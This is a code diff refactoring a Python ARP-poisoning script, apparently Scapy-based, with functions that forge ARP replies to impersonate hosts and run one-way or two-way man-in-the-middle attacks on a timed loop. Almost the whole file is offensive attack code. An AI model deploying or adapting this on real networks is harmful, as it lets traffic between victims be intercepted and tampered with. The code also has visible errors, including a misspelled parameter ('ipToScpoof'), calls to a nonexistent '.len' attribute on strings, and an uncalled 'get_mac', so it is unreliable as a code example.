@@ -6,7 +6,7 @@ def ellapsed_time(st):
     et = time.time() - st
     return et
 
-def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof,iface):
+def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof,interface):
     arp = Ether() / ARP()
     arp[Ether].src = macAttacker
     arp[ARP].hwsrc = macAttacker
@@ -14,7 +14,7 @@ def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof,iface):
     arp[ARP].hwdst = macVictim
     arp[ARP].pdst = ipVictim
 
-    sendp(arp, iface = iface)
+    sendp(arp, iface = interface)
     
 def mac_self():
     mac = get_mac
@@ -23,40 +23,47 @@ def mac_self():
     mac = ':'.join(a+b for a,b in zip(t, t))
     return mac
     
-def oneWayPoisoning(pap):
+def oneWayPoisoning(interface, ipVictim, ipToScpoof):
     
-    if(pap):
-        iface = conf.iface
-    else:
-        iface = raw_input("Interface?:\n>>>")
+    if(interface == None):
+        interface = conf.iface
+    #else:
+        #interface = raw_input("Interface?:\n>>>")
         
     #ipAttacker = raw_input("Attacker IP address:\n>>>")
-    ipAttacker = get_if_addr(iface)
+    ipAttacker = get_if_addr(interface)
     macAttacker = mac_self()
     
     #macVictim = raw_input("Victim MAC address:\n>>>")    
-    ipVictim = raw_input("Victim IP address:\n>>>")
+    #ipVictim = raw_input("Victim IP address:\n>>>")
     macVictim = getmacbyip(ipVictim)
         
 
-    ipToSpoof = raw_input("IP address to impersonate:\n>>>")
+    #ipToSpoof = raw_input("IP address to impersonate:\n>>>")
         
     start_time = time.time()
+    
+    
         
-    while True:
-        if (ellapsed_time(start_time) > 20):
-            arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof,iface)
-            start_time = time.time()
+    while (interface.len > 0) and (ipVictim.len > 0) and (ipToSpoof.len > 0):
+        
+        try:
+            if (ellapsed_time(start_time) > 20):
+                arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof,interface)
+                start_time = time.time()
+        
+        except KeyboardInterrupt:
+            return
     
 def mimAttack(pap):
     
     if(pap):
-        iface = conf.iface
+        interface = conf.iface
     else:
-        iface = raw_input("Interface?:\n>>>")
+        interface = raw_input("Interface?:\n>>>")
     
     #ipAttacker = raw_input("Attacker IP address:\n>>>")
-    ipAttacker = get_if_addr(iface)
+    ipAttacker = get_if_addr(interface)
     macAttacker = mac_self()
 
     #macVictim1 = raw_input("Victim 1 MAC address:\n>>>")
@@ -69,8 +76,13 @@ def mimAttack(pap):
     
     start_time = time.time()
     
-    while True:
-        if (ellapsed_time(start_time) > 20):
-            arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2,iface)
-            arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1,iface)
-            start_time = time.time()
+    while (interface.len > 0) and (ipVictim1.len > 0) and (ipVictim2.len > 0):
+        
+        try:
+            if (ellapsed_time(start_time) > 20):
+                arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2,interface)
+                arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1,interface)
+                start_time = time.time()
+        
+        except KeyboardInterrupt:
+            return
